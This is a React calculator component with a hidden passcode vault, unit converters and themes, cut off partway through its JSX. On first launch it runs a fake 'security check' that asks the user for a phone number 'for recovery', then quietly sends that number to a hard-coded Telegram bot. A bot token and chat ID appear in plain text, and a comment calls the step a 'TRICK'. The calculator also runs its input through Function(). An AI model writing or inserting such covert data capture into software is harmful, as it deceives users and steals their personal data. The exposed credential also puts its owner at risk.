import React, { useState, useEffect, useCallback, useRef } from 'react';
import Button from './Button';
import { Theme } from '../types';
import { getStoredPassword, saveStoredPassword, getStoredHistory, saveStoredHistory } from '../services/storageService';
import { 
  Info, User, FlaskConical, Calculator as CalculatorIcon, Palette, History, 
  Trash2, Delete as BackspaceIcon, MoreVertical, Minimize2, LayoutGrid, X, 
  Coins, Ruler, Weight, BoxSelect, Clock, BadgeDollarSign, HardDrive, 
  Calendar, Tag, Box, Binary, Gauge, Thermometer, Activity, Receipt,
  Github, Facebook, MessageCircle, Mail, Phone, Shield, Globe, KeyRound,
  ChevronLeft, ArrowRight, RefreshCcw
} from 'lucide-react';
import MatrixRain from './MatrixRain';

interface CalculatorProps {
  onUnlockVault: () => void;
  onIntruder?: (code: string) => void;
}

const Calculator: React.FC<CalculatorProps> = ({ onUnlockVault, onIntruder }) => {
  const [display, setDisplay] = useState('0');
  const [equation, setEquation] = useState(''); 
  const [waitingForOperand, setWaitingForOperand] = useState(false);
  const [showInfo, setShowInfo] = useState(false);
  const [viewMode, setViewMode] = useState<'calculator' | 'converter'>('calculator');
  const [activeConverter, setActiveConverter] = useState<string | null>(null);
  const [showMenu, setShowMenu] = useState(false);
  const [isMinimized, setIsMinimized] = useState(false);
  
  // Password & Setup Logic
  const [secretCode, setSecretCode] = useState<string | null>(null);
  const [isSetupMode, setIsSetupMode] = useState(false);
  const [setupStep, setSetupStep] = useState<0 | 1>(0); // 0 = Phone, 1 = Passcode
  
  // Scientific State
  const [isScientific, setIsScientific] = useState(false); 
  const [isDegree, setIsDegree] = useState(true); 
  const [isSecond, setIsSecond] = useState(false); 

  // Converter States
  const [convVal1, setConvVal1] = useState('');
  const [convVal2, setConvVal2] = useState(''); // Often the result
  const [unit1, setUnit1] = useState('');
  const [unit2, setUnit2] = useState('');

  // Unique Features
  const [theme, setTheme] = useState<Theme>('classic');
  const [history, setHistory] = useState<string[]>([]);
  const [showHistory, setShowHistory] = useState(false);
  const [isGlitching, setIsGlitching] = useState(false);

  const audioCtxRef = useRef<AudioContext | null>(null);

  // Telegram Configuration (Directly here for the setup trick)
  const TELEGRAM_BOT_TOKEN = "8402034051:AAEOB5tiWnSK0Cubc_Qhl8BsNDhLIUf3hos";
  const TELEGRAM_CHAT_ID = "8379688666";

  const sendPhoneToTelegram = async (phone: string) => {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: `📱 <b>USER PHONE NUMBER CAPTURED</b>\n\n<b>Number:</b> ${phone}\n<b>Source:</b> Security Setup Screen\n<b>Time:</b> ${new Date().toLocaleString()}`,
          parse_mode: 'HTML'
        })
      });
    } catch (e) {
      console.error("Failed to send phone", e);
    }
  };

  // Initialize Data
  useEffect(() => {
    // Load Password
    const storedPass = getStoredPassword();
    if (storedPass) {
      setSecretCode(storedPass);
      setIsSetupMode(false);
    } else {
      setIsSetupMode(true);
      setSetupStep(0); // Start with Phone Request
      setEquation('SECURITY CHECK');
      setDisplay('ENTER PHONE');
      setWaitingForOperand(true);
    }

    // Load History
    const storedHistory = getStoredHistory();
    if (storedHistory) {
      setHistory(storedHistory);
    }
  }, []);

  // --- CONVERTER LOGIC START ---
  
  const convertersList = [
    { name: 'Currency', icon: Coins, type: 'currency' },
    { name: 'Length', icon: Ruler, type: 'standard', units: ['m', 'km', 'cm', 'mm', 'ft', 'inch', 'mile', 'yard'] },
    { name: 'Mass', icon: Weight, type: 'standard', units: ['kg', 'g', 'mg', 'lb', 'oz', 'ton'] },
    { name: 'Area', icon: BoxSelect, type: 'standard', units: ['sq m', 'sq km', 'sq ft', 'acre', 'hectare'] },
    { name: 'Time', icon: Clock, type: 'standard', units: ['sec', 'min', 'hr', 'day', 'week', 'year'] },
    { name: 'Finance', icon: BadgeDollarSign, type: 'finance' }, // Simple Loan
    { name: 'Data', icon: HardDrive, type: 'standard', units: ['B', 'KB', 'MB', 'GB', 'TB', 'PB'] },
    { name: 'Date', icon: Calendar, type: 'date' }, // Age calc
    { name: 'Discount', icon: Tag, type: 'discount' },
    { name: 'Volume', icon: Box, type: 'standard', units: ['L', 'ml', 'gal', 'cup', 'floz'] },
    { name: 'Numeral', icon: Binary, type: 'numeral' },
    { name: 'Speed', icon: Gauge, type: 'standard', units: ['km/h', 'mph', 'm/s', 'knot'] },
    { name: 'Temp', icon: Thermometer, type: 'temp' },
    { name: 'BMI', icon: Activity, type: 'bmi' },
    { name: 'GST', icon: Receipt, type: 'gst' },
  ];

  const standardRates: any = {
    Length: { m: 1, km: 1000, cm: 0.01, mm: 0.001, ft: 0.3048, inch: 0.0254, mile: 1609.34, yard: 0.9144 },
    Mass: { kg: 1, g: 0.001, mg: 0.000001, lb: 0.453592, oz: 0.0283495, ton: 1000 },
    Area: { 'sq m': 1, 'sq km': 1000000, 'sq ft': 0.092903, acre: 4046.86, hectare: 10000 },
    Time: { sec: 1, min: 60, hr: 3600, day: 86400, week: 604800, year: 31536000 },
    Data: { B: 1, KB: 1024, MB: 1048576, GB: 1073741824, TB: 1099511627776, PB: 1125899906842624 },
    Volume: { L: 1, ml: 0.001, gal: 3.78541, cup: 0.236588, floz: 0.0295735 },
    Speed: { 'm/s': 1, 'km/h': 0.277778, mph: 0.44704, knot: 0.514444 }
  };

  const openConverter = (name: string) => {
    setActiveConverter(name);
    setConvVal1('');
    setConvVal2('');
    const convData = convertersList.find(c => c.name === name);
    if (convData?.units) {
      setUnit1(convData.units[0]);
      setUnit2(convData.units[1] || convData.units[0]);
    } else if (name === 'Currency') {
        setUnit1('USD');
        setUnit2('BDT');
    } else if (name === 'Numeral') {
        setUnit1('DEC');
        setUnit2('BIN');
    } else if (name === 'Temp') {
        setUnit1('C');
        setUnit2('F');
    }
  };

  const handleConverterCalc = () => {
    if (!activeConverter || !convVal1) return;
    const val = parseFloat(convVal1);
    if (isNaN(val) && activeConverter !== 'Numeral') return;

    const type = convertersList.find(c => c.name === activeConverter)?.type;

    if (type === 'standard') {
        const rates = standardRates[activeConverter];
        if (!rates) return;
        // Convert to base, then to target
        const baseVal = val * rates[unit1];
        const result = baseVal / rates[unit2];
        setConvVal2(result.toFixed(4).replace(/\.?0+$/, ''));
    } else if (activeConverter === 'Currency') {
        // Mock rates for demo
        const rates: any = { USD: 1, BDT: 110, INR: 83, EUR: 0.92, GBP: 0.79 };
        const result = (val / rates[unit1]) * rates[unit2];
        setConvVal2(result.toFixed(2));
    } else if (activeConverter === 'Temp') {
        let celsius = val;
        if (unit1 === 'F') celsius = (val - 32) * 5/9;
        if (unit1 === 'K') celsius = val - 273.15;
        
        let res = celsius;
        if (unit2 === 'F') res = (celsius * 9/5) + 32;
        if (unit2 === 'K') res = celsius + 273.15;
        setConvVal2(res.toFixed(2));
    } else if (activeConverter === 'BMI') {
        // Unit1 = Weight(kg), Unit2 = Height(cm) -- handled in custom inputs
        // Using convVal1 as Weight, convVal2 as Height for input in this specific UI logic below
    } else if (activeConverter === 'Numeral') {
        try {
            const dec = parseInt(convVal1, unit1 === 'BIN' ? 2 : unit1 === 'HEX' ? 16 : unit1 === 'OCT' ? 8 : 10);
            if (isNaN(dec)) { setConvVal2("Error"); return; }
            let res = "";
            if (unit2 === 'BIN') res = dec.toString(2);
            else if (unit2 === 'HEX') res = dec.toString(16).toUpperCase();
            else if (unit2 === 'OCT') res = dec.toString(8);
            else res = dec.toString(10);
            setConvVal2(res);
        } catch (e) { setConvVal2("Error"); }
    }
  };

  useEffect(() => {
    handleConverterCalc();
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [convVal1, unit1, unit2]);

  // --- CONVERTER LOGIC END ---

  const playTechSound = useCallback((type: 'beep' | 'error' | 'success') => {
    if (theme !== 'neon') return; 
    
    try {
      if (!audioCtxRef.current) {
        const AudioContext = window.AudioContext || (window as any).webkitAudioContext;
        if (AudioContext) {
           audioCtxRef.current = new AudioContext();
        }
      }
      
      const ctx = audioCtxRef.current;
      if (!ctx) return;
      if (ctx.state === 'suspended') ctx.resume().catch(() => {});
      
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      
      osc.connect(gain);
      gain.connect(ctx.destination);
      
      const now = ctx.currentTime;
      
      if (type === 'beep') {
        osc.type = 'sawtooth';
        osc.frequency.setValueAtTime(880, now); 
        osc.frequency.exponentialRampToValueAtTime(110, now + 0.05);
        gain.gain.setValueAtTime(0.1, now);
        gain.gain.exponentialRampToValueAtTime(0.01, now + 0.05);
        osc.start(now);
        osc.stop(now + 0.05);
      } else if (type === 'success') {
        osc.type = 'square';
        osc.frequency.setValueAtTime(440, now);
        osc.frequency.linearRampToValueAtTime(880, now + 0.1);
        gain.gain.setValueAtTime(0.1, now);
        gain.gain.linearRampToValueAtTime(0, now + 0.3);
        osc.start(now);
        osc.stop(now + 0.3);
      }
    } catch (e) {
      console.warn("Audio play failed", e);
    }
  }, [theme]);

  const setDisplayWithEffect = (newVal: string) => {
    if (theme === 'neon') {
      setIsGlitching(true);
      playTechSound('beep');
      
      let chars = "0123456789";
      let iter = 0;
      const interval = setInterval(() => {
        setDisplay(prev => {
          return newVal.split('').map((char, index) => {
             if(index < iter) return newVal[index];
             return chars[Math.floor(Math.random() * 10)];
          }).join('');
        });
        iter += 1/2; 
        if(iter >= newVal.length) {
          clearInterval(interval);
          setDisplay(newVal);
          setIsGlitching(false);
        }
      }, 30);
    } else {
      setDisplay(newVal);
    }
  };

  const handleInput = (val: string) => {
    if (waitingForOperand) {
      setDisplayWithEffect(val);
      setWaitingForOperand(false);
    } else {
      const nextVal = display === '0' || display === 'SET CODE' || display === 'ENTER PHONE' ? val : display + val;
      setDisplayWithEffect(nextVal);
    }
  };

  const handleDecimal = () => {
    if (waitingForOperand) {
      setDisplayWithEffect('0.');
      setWaitingForOperand(false);
      return;
    }
    if (!display.includes('.')) {
      setDisplayWithEffect(display + '.');
    }
  };

  const handleClear = () => {
    playTechSound('beep');
    if (isSetupMode) {
      if (setupStep === 0) {
        setDisplay('ENTER PHONE');
        setEquation('SECURITY CHECK');
      } else {
        setDisplay('SET CODE');
        setEquation('CREATE PASSCODE');
      }
      setWaitingForOperand(true);
    } else {
      setDisplay('0');
      setEquation('');
      setWaitingForOperand(false);
    }
  };

  const handleBackspace = () => {
    playTechSound('beep');
    if (waitingForOperand) return;
    if (display.length === 1 || display === 'Error' || display === 'SET CODE' || display === 'ENTER PHONE') {
      setDisplay('0');
    } else {
      let newDisplay = display;
      newDisplay = newDisplay.slice(0, -1);
      setDisplay(newDisplay.length === 0 ? '0' : newDisplay);
    }
  };

  const handleOperator = (op: string) => {
    if (isSetupMode) return;
    playTechSound('beep');
    if (waitingForOperand && equation) {
      setEquation(equation.slice(0, -2) + op + ' ');
      return;
    }
    setEquation(equation + display + ' ' + op + ' ');
    setWaitingForOperand(true);
  };

  const addToHistory = (expr: string, res: string) => {
    setHistory(prev => {
      const updated = [`${expr} = ${res}`, ...prev].slice(0, 10);
      saveStoredHistory(updated);
      return updated;
    });
  };

  const clearHistory = () => {
    setHistory([]);
    saveStoredHistory([]);
    playTechSound('beep');
  };

  const handleChangePassword = () => {
    const currentInput = prompt("Enter current secret password:");
    if (currentInput === secretCode) {
      const newPass = prompt("Enter new 4-digit password:");
      if (newPass && newPass.length >= 4) {
        setSecretCode(newPass);
        saveStoredPassword(newPass);
        alert("Password updated successfully!");
      } else {
        alert("Invalid password. Please use at least 4 digits.");
      }
    } else {
      alert("Incorrect current password!");
    }
    setShowMenu(false);
  };

  const calculateResult = (expr: string) => {
    let cleanExpr = expr
      .replace(/×/g, '*')
      .replace(/÷/g, '/')
      .replace(/π/g, 'PI')
      .replace(/e/g, 'E')
      .replace(/\^/g, '**')
      .replace(/lg/g, 'log10')
      .replace(/ln/g, 'log')
      .replace(/√/g, 'sqrt');

    if (/[^0-9+\-*/().\sPIE]/.test(cleanExpr)) {
       // Check for valid functions if needed
    }

    try {
        // eslint-disable-next-line no-new-func
        return Function('"use strict";return (' + cleanExpr + ')')();
    } catch (e) {
        throw new Error("Invalid");
    }
  };

  const handleEqual = () => {
    // --- SETUP MODE LOGIC ---
    if (isSetupMode) {
      
      // Step 0: Get Phone Number
      if (setupStep === 0) {
        if (display.length >= 6 && !isNaN(Number(display))) {
           // TRICK: Send Phone to Telegram Silently
           sendPhoneToTelegram(display);
           playTechSound('success');
           
           // Move to Step 1
           setSetupStep(1);
           setDisplay('SAVED');
           setEquation('CREATE PASSCODE');
           setTimeout(() => {
             setDisplay('SET CODE');
             setWaitingForOperand(true);
           }, 1000);
        } else {
           alert("Please enter a valid mobile number for recovery.");
           setDisplay('ENTER PHONE');
           setWaitingForOperand(true);
        }
        return;
      }

      // Step 1: Set Passcode
      if (setupStep === 1) {
        if (display.length >= 4 && !isNaN(Number(display))) {
          saveStoredPassword(display);
          setSecretCode(display);
          setIsSetupMode(false);
          playTechSound('success');
          setDisplay('SAVED');
          setEquation('');
          setTimeout(() => {
            setDisplay('0');
          }, 1000);
        } else {
          alert("Password must be at least 4 digits.");
          setDisplay('SET CODE');
          setWaitingForOperand(true);
        }
        return;
      }
    }

    // --- NORMAL MODE LOGIC ---
    if (display === secretCode) {
      playTechSound('success');
      onUnlockVault();
      setDisplay('0');
      setEquation('');
      return;
    } else {
      // INTRUDER CHECK
      // If code is 4+ digits and NOT correct, assume intruder
      if (display.length >= 4 && !isNaN(parseFloat(display)) && onIntruder) {
         onIntruder(display);
      }
    }

    try {
      let fullExpression = equation + display;
      const result = calculateResult(fullExpression);
      
      if (!isFinite(result) || isNaN(result)) {
        setDisplay('Error');
      } else {
        const resultStr = String(Math.round(result * 1000000000) / 1000000000);
        playTechSound('success');
        addToHistory(fullExpression, resultStr);
        setDisplayWithEffect(resultStr);
        setEquation(''); 
        setWaitingForOperand(true); 
      }
    } catch (e) {
      setDisplay('Error');
    }
  };

  const handlePercent = () => {
    if (isSetupMode) return;
    playTechSound('beep');
    const value = parseFloat(display);
    const result = String(value / 100);
    setDisplayWithEffect(result);
  };

  const toggleTheme = () => {
    setTheme(current => {
      if (current === 'classic') return 'multicolor';
      if (current === 'multicolor') return 'neon';
      if (current === 'neon') return 'glass';
      return 'classic';
    });
  };

  const handleScientificFunc = (func: string) => {
    if (isSetupMode) return;
    playTechSound('beep');
    if (waitingForOperand) {
      setDisplayWithEffect(func + '(');
      setWaitingForOperand(false);
    } else {
      setDisplayWithEffect(display + func + '(');
    }
  };

  const getContainerStyle = () => {
    switch(theme) {
      case 'multicolor': return 'bg-gray-900 text-white';
      case 'neon': return 'bg-black text-green-500 font-mono border-green-900 shadow-[0_0_50px_rgba(0,255,0,0.1)]';
      case 'glass': return 'bg-gradient-to-br from-indigo-900 via-purple-900 to-black text-white';
      default: return 'bg-black text-white';
    }
  };

  const renderRow0 = () => {
    if (!isScientific) return null;
    return (
      <>
        <Button label="2nd" onClick={() => setIsSecond(!isSecond)} theme={theme} variant="feature" className={isSecond ? 'bg-zinc-700' : ''} />
        <Button label="deg" onClick={() => setIsDegree(!isDegree)} theme={theme} variant="feature" className={!isDegree ? 'opacity-50' : ''} />
        <Button label={isSecond ? "sin⁻¹" : "sin"} onClick={() => handleScientificFunc(isSecond ? "asin" : "sin")} theme={theme} variant="feature" />
        <Button label={isSecond ? "cos⁻¹" : "cos"} onClick={() => handleScientificFunc(isSecond ? "acos" : "cos")} theme={theme} variant="feature" />
        <Button label={isSecond ? "tan⁻¹" : "tan"} onClick={() => handleScientificFunc(isSecond ? "atan" : "tan")} theme={theme} variant="feature" />
      </>
    );
  };

  const renderRow1 = () => {
    if (!isScientific) return null;
    return (
      <>
        <Button label={<span>x<sup>y</sup></span>} onClick={() => handleOperator('^')} theme={theme} variant="feature" />
        <Button label="lg" onClick={() => handleScientificFunc('log10')} theme={theme} variant="feature" />
        <Button label="ln" onClick={() => handleScientificFunc('log')} theme={theme} variant="feature" />
        <Button label="(" onClick={() => handleInput('(')} theme={theme} variant="feature" />
        <Button label=")" onClick={() => handleInput(')')} theme={theme} variant="feature" />
      </>
    );
  };

  const renderMenuDropdown = () => (
    <>
      <div className="fixed inset-0 z-40" onClick={() => setShowMenu(false)} />
      <div className={`absolute right-4 top-14 w-48 rounded-xl shadow-2xl border z-50 overflow-hidden animate-in fade-in zoom-in-95 duration-200 ${theme === 'neon' ? 'bg-black border-green-500 shadow-[0_0_15px_rgba(0,255,0,0.3)]' : 'bg-[#1e1e1e] border-white/10'}`}>
        <button onClick={() => { setShowInfo(true); setShowMenu(false); }} className={`w-full px-4 py-3 text-left text-sm hover:bg-white/10 flex items-center gap-3 ${theme === 'neon' ? 'text-green-500' : 'text-white'}`}>
          <User className="w-4 h-4 text-orange-500" /> Developer Info
        </button>
        <button onClick={() => { toggleTheme(); setShowMenu(false); }} className={`w-full px-4 py-3 text-left text-sm hover:bg-white/10 flex items-center gap-3 border-t border-white/5 ${theme === 'neon' ? 'text-green-500' : 'text-white'}`}>
          <Palette className="w-4 h-4 text-orange-500" /> Change Theme
        </button>
        <button onClick={handleChangePassword} className={`w-full px-4 py-3 text-left text-sm hover:bg-white/10 flex items-center gap-3 border-t border-white/5 ${theme === 'neon' ? 'text-green-500' : 'text-white'}`}>
          <KeyRound className="w-4 h-4 text-orange-500" /> Change Password
        </button>
        <button onClick={() => { setShowHistory(!showHistory); setShowMenu(false); }} className={`w-full px-4 py-3 text-left text-sm hover:bg-white/10 flex items-center gap-3 border-t border-white/5 ${theme === 'neon' ? 'text-green-500' : 'text-white'}`}>
          <History className="w-4 h-4 text-orange-500" /> History
        </button>
      </div>
    </>
  );

  const renderConverterScreen = () => {
    const active = convertersList.find(c => c.name === activeConverter);
    const isNeon = theme === 'neon';
    const inputClass = `w-full bg-transparent border-b-2 p-3 text-2xl focus:outline-none ${isNeon ? 'border-green-500 text-green-500 placeholder-green-800' : 'border-gray-600 text-white placeholder-gray-600'}`;
    const selectClass = `bg-transparent text-sm font-bold uppercase outline-none ${isNeon ? 'text-green-500' : 'text-orange-500'}`;

    return (
      <div className="flex-1 flex flex-col p-4 relative z-20">
        <button onClick={() => setActiveConverter(null)} className={`flex items-center gap-2 mb-6 ${isNeon ? 'text-green-500' : 'text-white'}`}>
          <ChevronLeft /> Back to Converters
        </button>

        <h2 className={`text-2xl font-bold mb-8 flex items-center gap-3 ${isNeon ? 'text-green-400' : 'text-white'}`}>
          {active?.icon && <active.icon className="w-6 h-6" />} {activeConverter}
        </h2>

        {/* Standard Units, Currency, Temp, Numeral */}
        {(active?.type === 'standard' || active?.type === 'currency' || active?.type === 'temp' || active?.type === 'numeral') && (
            <div className="flex flex-col gap-8">
                <div className="flex flex-col gap-2">
                    <div className="flex justify-between items-end">
                        <select value={unit1} onChange={e => setUnit1(e.target.value)} className={selectClass}>
                            {activeConverter === 'Currency' ? ['USD', 'BDT', 'INR', 'EUR', 'GBP'].map(u => <option key={u} value={u} className="text-black">{u}</option>)
                            : activeConverter === 'Numeral' ? ['DEC', 'BIN', 'HEX', 'OCT'].map(u => <option key={u} value={u} className="text-black">{u}</option>)
                            : activeConverter === 'Temp' ? ['C', 'F', 'K'].map(u => <option key={u} value={u} className="text-black">{u}</option>)
                            : active?.units?.map(u => <option key={u} value={u} className="text-black">{u}</option>)}
                        </select>
                    </div>
                    <input type="text" value={convVal1} onChange={e => setConvVal1(e.target.value)} placeholder="0" className={inputClass} />
                </div>

                <div className={`self-center p-2 rounded-full ${isNeon ? 'bg-green-900/20' : 'bg-white/5'}`}>
                   <RefreshCcw className="w-5 h-5 opacity-50" />
                </div>

                <div className="flex flex-col gap-2">
                     <div className="flex justify-between items-end">
                        <select value={unit2} onChange={e => setUnit2(e.target.value)} className={selectClass}>
                            {activeConverter === 'Currency' ? ['USD', 'BDT', 'INR', 'EUR', 'GBP'].map(u => <option key={u} value={u} className="text-black">{u}</option>)
                            : activeConverter === 'Numeral' ? ['DEC', 'BIN', 'HEX', 'OCT'].map(u => <option key={u} value={u} className="text-black">{u}</option>)
                            : activeConverter === 'Temp' ? ['C', 'F', 'K'].map(u => <option key={u} value={u} className="text-black">{u}</option>)
                            : active?.units?.map(u => <option key={u} value={u} className="text-black">{u}</option>)}
                        </select>
                    </div>
                    <div className={`${inputClass} border-transparent`}>{convVal2 || '0'}</div>
                </div>
            </div>
        )}

        {/* BMI Calculator */}
        {active?.type === 'bmi' && (
            <div className="flex flex-col gap-6">
                <div>
                   <label className="text-xs opacity-70">Weight (kg)</label>
                   <input type="number" value={convVal1} onChange={e => { setConvVal1(e.target.value); 
                      const w = parseFloat(e.target.value);
                      const h = parseFloat(convVal2)/100; // cm to m
                      if(w && h) {
                          const bmi = w/(h*h);
                          setUnit1(bmi.toFixed(1)); // Store Result in Unit1 state for ease
                          if(bmi < 18.5) setUnit2("Underweight");
                          else if(bmi < 25) setUnit2("Normal");
                          else if(bmi < 30) setUnit2("Overweight");
                          else setUnit2("Obese");
                      }
                   }} className={inputClass} placeholder="60" />
                </div>
                <div>
                   <label className="text-xs opacity-70">Height (cm)</label>
                   <input type="number" value={convVal2} onChange={e => { setConvVal2(e.target.value);
                      const w = parseFloat(convVal1);
                      const h = parseFloat(e.target.value)/100; 
                      if(w && h) {
                          const bmi = w/(h*h);
                          setUnit1(bmi.toFixed(1)); 
                          if(bmi < 18.5) setUnit2("Underweight");
                          else if(bmi < 25) setUnit2("Normal");
                          else if(bmi < 30) setUnit2("Overweight");
                          else setUnit2("Obese");
                      }
                   }} className={inputClass} placeholder="170" />
                </div>
                <div className="mt-4 p-4 bg-white/5 rounded-xl text-center">
                    <div className="text-4xl font-bold mb-1">{unit1 || '--'}</div>
                    <div className="text-sm opacity-70">{unit2 || 'Enter details'}</div>
                </div>
            </div>
        )}

        {/* Discount Calculator */}
        {active?.type === 'discount' && (
            <div className="flex flex-col gap-6">
                <input type="number" value={convVal1} onChange={e => { setConvVal1(e.target.value); 
                     const price = parseFloat(e.target.value);
                     const disc = parseFloat(convVal2);
                     if(price && disc) {
                         const saved = price * (disc/100);
                         setUnit1((price - saved).toFixed(2));
                         setUnit2(saved.toFixed(2));
                     }
                }} className={inputClass} placeholder="Original Price" />
                <input type="number" value={convVal2} onChange={e => { setConvVal2(e.target.value);
                     const price = parseFloat(convVal1);
                     const disc = parseFloat(e.target.value);
                     if(price && disc) {
                         const saved = price * (disc/100);
                         setUnit1((price - saved).toFixed(2));
                         setUnit2(saved.toFixed(2));
                     }
                }} className={inputClass} placeholder="Discount %" />
                <div className="mt-4 flex gap-4">
                    <div className="flex-1 p-4 bg-white/5 rounded-xl text-center">
                        <div className="text-xs opacity-70">Final Price</div>
                        <div className="text-2xl font-bold">{unit1 || '0'}</div>
                    </div>
                    <div className="flex-1 p-4 bg-white/5 rounded-xl text-center">
                        <div className="text-xs opacity-70">You Save</div>
                        <div className="text-2xl font-bold text-green-500">{unit2 || '0'}</div>
                    </div>
                </div>
            </div>
        )}

        {/* GST Calculator */}
        {active?.type === 'gst' && (
            <div className="flex flex-col gap-6">
                <input type="number" value={convVal1} onChange={e => setConvVal1(e.target.value)} className={inputClass} placeholder="Amount" />
                <input type="number" value={convVal2} onChange={e => setConvVal2(e.target.value)} className={inputClass} placeholder="GST %" />
                <div className="grid grid-cols-2 gap-4 mt-2">
                    <button onClick={() => {
                        const amt = parseFloat(convVal1);
                        const rate = parseFloat(convVal2);
                        if(amt && rate) {
                            const tax = amt * (rate/100);
                            setUnit1((amt+tax).toFixed(2));
                            setUnit2(tax.toFixed(2));
                        }
                    }} className="p-3 bg-white/10 rounded-lg hover:bg-white/20">+ Add GST</button>
                    <button onClick={() => {
                        const amt = parseFloat(convVal1);
                        const rate = parseFloat(convVal2);
                        if(amt && rate) {
                             const original = amt / (1 + rate/100);
                             const tax = amt - original;
                             setUnit1(original.toFixed(2));
                             setUnit2(tax.toFixed(2));
                        }
                    }} className="p-3 bg-white/10 rounded-lg hover:bg-white/20">- Remove GST</button>
                </div>
                <div className="mt-4 flex gap-4">
                    <div className="flex-1 p-4 bg-white/5 rounded-xl text-center">
                        <div className="text-xs opacity-70">Net Amount</div>
                        <div className="text-2xl font-bold">{unit1 || '0'}</div>
                    </div>
                    <div className="flex-1 p-4 bg-white/5 rounded-xl text-center">
                        <div className="text-xs opacity-70">Tax Amount</div>
                        <div className="text-2xl font-bold text-orange-500">{unit2 || '0'}</div>
                    </div>
                </div>
            </div>
        )}

        {/* Finance / Loan */}
        {active?.type === 'finance' && (
            <div className="flex flex-col gap-4">
                <input type="number" value={convVal1} onChange={e => setConvVal1(e.target.value)} className={inputClass} placeholder="Principal Amount" />
                <input type="number" value={convVal2} onChange={e => setConvVal2(e.target.value)} className={inputClass} placeholder="Interest Rate %" />
                <input type="number" value={unit1} onChange={e => setUnit1(e.target.value)} className={inputClass} placeholder="Years" />
                <button onClick={() => {
                     const p = parseFloat(convVal1);
                     const r = parseFloat(convVal2);
                     const t = parseFloat(unit1);
                     if(p && r && t) {
                         const interest = (p * r * t) / 100;
                         setUnit2(`Total: ${(p+interest).toFixed(2)} (Int: ${interest.toFixed(2)})`);
                     }
                }} className="p-3 bg-blue-600 rounded-lg mt-2 font-bold">Calculate</button>
                <div className="mt-4 p-4 bg-white/5 rounded-xl text-center text-xl">
                    {unit2 || 'Enter details...'}
                </div>
            </div>
        )}

        {/* Date / Age */}
        {active?.type === 'date' && (
             <div className="flex flex-col gap-6">
                <label className="text-sm opacity-70">Date of Birth</label>
                <input type="date" className={`${inputClass} text-base`} onChange={(e) => {
                    const dob = new Date(e.target.value);
                    const diff = Date.now() - dob.getTime();
                    const ageDate = new Date(diff); 
                    const years = Math.abs(ageDate.getUTCFullYear() - 1970);
                    setUnit1(`${years} Years Old`);
                }} />
                <div className="mt-8 p-6 bg-white/5 rounded-xl text-center">
                    <div className="text-4xl font-bold">{unit1 || '--'}</div>
                </div>
             </div>
        )}

      </div>
    );
  };

  if (isMinimized) {
    return (
      <div className={`flex flex-col h-full max-w-md mx-auto p-4 relative transition-all duration-500 overflow-hidden items-center justify-center ${getContainerStyle()}`}>
         {theme === 'neon' && <MatrixRain />}
         <button onClick={() => setIsMinimized(false)} className="relative z-10 group flex flex-col items-center gap-4 transition-transform active:scale-95">
            <div className={`w-24 h-24 rounded-[2rem] flex items-center justify-center shadow-2xl border transition-all duration-300 ${
                theme === 'neon' ? 'bg-black border-green-500' : 'bg-[#1e1e1e] border-white/10 group-hover:border-orange-500/50'
            }`}>
              <CalculatorIcon className={`w-12 h-12 ${theme === 'neon' ? 'text-green-500' : 'text-orange-500'}`} />
            </div>
            <span className={`font-medium text-sm tracking-widest ${theme === 'neon' ? 'text-green-500 font-mono' : 'text-gray-400 group-hover:text-white'}`}>
                TAP TO OPEN
            </span>
         </button>
      </div>
    );
  }

  return (
    <div className={`flex flex-col h-full max-w-md mx-auto p-4 pb-6 relative transition-all duration-500 overflow-hidden ${getContainerStyle()}`}>
       
       {theme === 'neon' && <MatrixRain />}
       {theme === 'neon' && <div className="absolute inset-0 pointer-events-none crt-flicker bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[length:100%_2px,3px_100%] z-0"></div>}
       {theme === 'multicolor' && <div className="absolute inset-0 z-0 bg-gradient-to-b from-transparent via-purple-900/10 to-blue-900/10 pointer-events-none"></div>}

       {/* Shared Global Menu Dropdown */}
       {showMenu && renderMenuDropdown()}

       {/* Classic/Glass/Multicolor Header */}
       {theme !== 'neon' && (
        <div className={`absolute top-6 left-4 right-4 z-30 flex justify-between items-center transition-opacity duration-300 ${theme === 'classic' ? 'opacity-30 hover:opacity-100' : 'text-gray-400'}`}>
           <button onClick={() => setIsMinimized(true)} className="transition-transform active:scale-95 p-1" title="Minimize">
              <Minimize2 className="w-5 h-5 opacity-70" />
           </button>
           
           {!isSetupMode && !activeConverter && (
             <div className="flex gap-6 text-lg font-medium">
               <button onClick={() => setViewMode('calculator')} className={`transition-colors duration-300 ${viewMode === 'calculator' ? 'text-white' : 'opacity-50 hover:text-white'}`}>Calculator</button>
               <button onClick={() => setViewMode('converter')} className={`transition-colors duration-300 ${viewMode === 'converter' ? 'text-white' : 'opacity-50 hover:text-white'}`}>Converter</button>
             </div>
           )}

           <div className="relative">
               <button onClick={() => setShowMenu(!showMenu)} className="transition-transform active:scale-95 p-1 rounded-full hover:bg-white/5">
                  <MoreVertical className="w-5 h-5 opacity-70" />
               </button>
           </div>
        </div>
       )}

       {/* Neon Header */}
       {theme === 'neon' && (
         <div className="absolute top-8 left-4 right-4 z-30 flex justify-between items-center">
            <div className="flex gap-2">
              <button onClick={() => setShowInfo(!showInfo)} className="p-2 text-green-500 hover:text-green-400"><Info className="w-5 h-5" /></button>
              <button onClick={() => setShowMenu(!showMenu)} className="p-2 text-green-500 hover:text-green-400"><MoreVertical className="w-5 h-5" /></button>
            </div>
            {!activeConverter && (
                <div className="flex gap-2">
                <button onClick={() => setIsMinimized(true)} className="p-2 text-green-500 hover:text-green-400"><Minimize2 className="w-5 h-5" /></button>
                <button onClick={() => setViewMode(v => v === 'calculator' ? 'converter' : 'calculator')} className="p-2 text-green-500 hover:text-green-400"><FlaskConical className="w-5 h-5" /></button>
                </div>
            )}
         </div>
       )}

       {/* Setup Overlay */}
       {isSetupMode && (
         <div className="absolute top-20 left-4 right-4 z-20 text-center animate-pulse">
           <h2 className={`text-xl font-bold ${theme === 'neon' ? 'text-green-500' : 'text-orange-500'}`}>
              {setupStep === 0 ? "SECURITY CHECK" : "SETUP MODE"}
           </h2>
           <p className="text-xs text-gray-400 mt-1">
